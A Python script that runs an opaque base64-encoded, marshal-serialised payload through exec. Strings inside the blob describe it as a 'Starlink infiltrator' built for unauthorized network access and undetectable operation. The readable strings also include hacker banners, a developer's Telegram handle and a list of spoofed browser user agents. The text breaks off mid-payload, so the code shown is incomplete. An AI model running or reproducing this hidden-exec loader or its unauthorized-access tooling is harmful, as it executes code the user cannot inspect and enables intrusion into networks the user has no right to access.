import marshal,base64
exec(marshal.loads(base64.b64decode(b'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iOKVlyAgICAgICAg4pWa4pWQ4pWQ4paI4paI4paI4pWU4pWdICAgICAgICAgICAgICAgICAgICAgIHx1mQAAAHwgIOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVkeKWiOKWiOKWiOKWiOKWiOKVlyAg4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4pWRICAg4paI4paI4pWR4paI4paI4paI4paI4paI4pWXICAgIOKWiOKWiOKWiOKVlOKVnSAgICAgICAgICAgICAgICAgICAgICAgfHWZAAAAfCAg4paI4paI4pWU4pWQ4pWQ4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4pWdICDilojilojilZTilZDilZDilojilojilZfilojilojilZEgICDilojilojilZHilZrilZDilZDilZDilZDilZ0gICDilojilojilojilZTilZ0gICAgICAgICAgICAgICAgICAgICAgICB8dZUAAAB8ICDilojilojilZEgIOKWiOKWiOKVkeKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKVkSAg4paI4paI4pWR4pWa4paI4paI4paI4paI4paI4paI4pWU4pWdICAgICAgICDilojilojilojilojilojilojilojilZcgICAgICAgICAgICAgICAgICAgICAgfHWRAAAAfCAg4pWa4pWQ4pWdICDilZrilZDilZ3ilZrilZDilZDilZDilZDilZDilZDilZ3ilZrilZDilZ0gIOKVmuKVkOKVnSDilZrilZDilZDilZDilZDilZDilZ0gICAgICAgICDilZrilZDilZDilZDilZDilZDilZDilZ0gICAgICAgICAgICAgICAgICAgICAgfHpLfCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBRVUFOVFVNIEJZUEFTUyBFTkdJTkUgdjMuMSAgICAgICAgICAgICAgICB8ehx8IERldmVsb3BlZCBieTogWmFyVGFyNTQzNyAoeg90Lm1lL1phclRhcjU0Mzd6HSkgICAgICAgICAgICAgICAgICAgICAgICAgICB8ehxJbml0aWFsaXppbmcgY29yZSBtb2R1bGVzLi4uZwAAAAAAAPg/Z5qZmZmZmak/KQJyHQAAAHIeAAAAejBFc3Rh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H1ABWwYAAAAAAAAAAA4AUAFTAlABWwIAAAAAAAAAAA4AUAFTIFABWwoAAAAAAAAAAA4AUAFTIVABWwYAAAAAAAAAAA4AUAFTAlABWwIAAAAAAAAAAA4AUAFTIlABWwYAAAAAAAAAAA4AUAFTI1ABNQEAAAAAAABuAFsUAAAAAAAAAAACACAAWxcAAAAAAAAAAFUANQEAAAAAAAAgAFsXAAAAAAAAAABbCgAAAAAAAAAADgBTJFsGAAAAAAAAAAAOAFMlMwQ1AQAAAAAAACAAWxgAAAAAAAAAAFIaAAAAAAAAAAAAAAAAAAAAAAAAIgBTJjUBAAAAAAAAIABTAFMAUwA1AgAAAAAAACAAZwAhACwAKAAAAAAAAABkAQAAZgIgAB8AIAAgAGcAPQMfAGYBKSdOciIAAAByDwAAAHouICAgICAgICAgICAgICAgLjo6LiAgICAgICAgICAgICAgICAgICAgICAgICAgIHUnAAAAICAg4qKg4qG+4qCD4qCA4qCA4qCA4qCA4qCA4qCA4qCw4qO24qGAei4gICAgICAgICAgICAgIF8vXF8gICAgICAgICAgICAgICAgICAgICAgICAgICAgdSsAAAAg4qKg4qG/4qCB4qO04qCH4qCA4qCA4qCA4qCA4qC44qOm4qCI4qK/4qGEei4gICAgICAgICAgICAgL19fX19cICAgICAgICAgICAgICAgICAgICAgICAgICAgdSsAAAAg4qO+4qGH4qK44qGP4qKw4qGH4qCA4qCA4qK44qGG4qK44qGG4qK44qGHeg4gICAgICAgICAgICB8INoCU0x6HiAgIHwgICAgICAgICAgICAgICAgICAgICAgICAgIHUrAAAAIOKiueKhh+KgmOKjp+KhiOKgg+KisOKhhuKgmOKigeKjvOKggeKjuOKhh3ouICAgICAgICAgICAgfCAgICAgIHwgICAgICAgICAgICAgICAgICAgICAgICAgIHUoAAAAIOKgiOKiv+KjhOKgmOKgg+KggOKiuOKhh+KggOKgmOKggeKjsOKhn3oNICAgICAgICAgICAgfHoGICAgICAgeht8ICAgICAgICAgICAgICAgICAgICAgICAgICB1JQAAACDioIDioIDioJnioIPioIDioIDiorjioYfioIDioIDioJjioIt1GQAAACDioIDioIDioIDioIDioIDioIDiorjioYfaBFdJRkl6HCB8ICAgICAgICAgICAgICAgICAgICAgICAgICB6LiAgICAgICAgICAgIHxfX19fX198ICAgICAgICAgICAgICAgICAgICAgICAgICB1GQAAACDioIDioIDioIDioIDioIDioIDioJjioIN6IiAgICAgICAgICAgL3wgICAgICB8XCAgICAgICAgICAgICB1VAAAAOKiuOKjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Khh3oiICAgICAgICAgIC8gfCAgICAgIHwgXCAgICAgICAgICAgIHVUAAAA4qK44qO/4qOf4qCJ4qK74qGf4qCJ4qK74qGf4qCJ4qO74qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qGHeiIgICAgICAgICAvICB8ICAgICAgfCAgXCAgICAgICAgICAgdVQAAADiorjio7/io7/io7fio7/io7/io7bio7/io7/io77io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/ioYd6IiAgICAgICAgLyAgIHwgICAgICB8ICAgXCAgICAgICAgICB1VAAAAOKgiOKgieKgieKiieKjieKjieKgieKgieKgieKgieKgieKgieKgieKgieKgieKgieKgieKgieKgieKgieKgieKgieKjieKjieKhieKgieKgieKggXoiICAgICAgIC9fX19ffF9fX19fX3xfX19fXCAgICAgICAgIHVOAAAA4qCA4qCA4qCA4qCA4qCJ4qCJ4qCJ4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCJ4qCJ4qCJehsgICAgICAvX19fX19fX19fX19fX19fX19fXCD6BQogICAgeghbVEFSR0VUXXo7IEVuZ2FnaW5nIFN0YXJsaW5rLWxpa2UgU2F0ZWxsaXRlIE5ldHdvcmsgSW5mcmFzdHJ1Y3R1cmUuLi7pAQAAACkOciwAAAByFQAAAHIuAAAAchYAAADaB2J5ZWxsb3dyGwAAANoE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cm9tZS8xMjMuMC4wLjAgU2FmYXJpLzUzNy4zNnpQTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTI0LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTI0LjB6U01vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDE0LjQ7IHJ2OjEyNC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEyNC4wenRNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTIzLjAuMC4wIEVkZ2UvMTIzLjAuMjQyMC41M3p1TW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTBfMTVfNykgQXBwbGVXZWJLaXQvNjA1LjEuMTUgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzE3LjQgU2FmYXJpLzYwNS4xLjE1eodNb3ppbGxhLzUuMCAoaVBob25lOyBDUFUgaVBob25lIE9TIDE3XzQgbGlrZSBNYWMgT1MgWCkgQXBwbGVXZWJLaXQvNjA1LjEuMTUgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzE3LjQgTW9iaWxlLzE1RTE0OCBTYWZhcmkvNjA0LjF6c01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgSykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMy4wLjYzMTIuNDAgTW9iaWxlIFNhZmFyaS81MzcuMzZ6RE1vemlsbGEvNS4wIChBbmRyb2lkIDE0OyBNb2JpbGU7IHJ2OjEyNC4wKSBHZWNrby8xMjQuMCBGaXJlZm94LzEyNC4wen1Nb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTQ7IFBpeGVsIDggUHJvKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTIzLjAuNjMxMi40MCBNb2JpbGUgU2FmYXJpLzUzNy4zNnp9TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMi4wLjAuMCBTYWZhcmkvNTM3LjM2IE9QUi8xMDguMC4wLjB6h01vemlsbGEvNS4wIChpUGhvbmU7IENQVSBpUGhvbmUgT1MgMTZfNiBsaWtlIE1hYyBPUyBYKSBBcHBsZVdlYktpdC82MDUuMS4xNSAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vMTYuNiBNb2JpbGUvMTVFMTQ4IFNhZmFyaS82MDQuMXp+TW96aWxsYS81LjAgKGlQYWQ7IENQVSBPUyAxN180IGxpa2UgTWFjIE9TIFgpIEFwcGxlV2ViS2l0LzYwNS4xLjE1IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi8xNy40IE1vYmlsZS8xNUUxNDggU2FmYXJpLzYwNC4xem9Nb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMS4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTIzLjAuMC4wIFNhZmFyaS81MzcuMzZ6gk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMzsgU2Ftc3VuZyBTTS1TOTE4QikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMy4wLjYzMTIuNDAgTW9iaWxlIFNhZmFyaS81MzcuMzZ6VE1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwLjE1OyBydjoxMjMuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMjMuMHpOTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEyNC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEyNC4wenRNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTIyLjAuNjI2MS4xMjkgU2FmYXJpLzUzNy4zNnp6TW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDE0OyBTTS1HOTkxQikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMy4wLjYzMTIuNDAgTW9iaWxlIFNhZmFyaS81MzcuMzZ6i01vemlsbGEvNS4wIChpUGhvbmU7IENQVSBpUGhvbmUgT1MgMTdfM18xIGxpa2UgTWFjIE9TIFgpIEFwcGxlV2ViS2l0LzYwNS4xLjE1IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi8xNy4zLjEgTW9iaWxlLzE1RTE0OCBTYWZhcmkvNjA0LjF6ak1vemls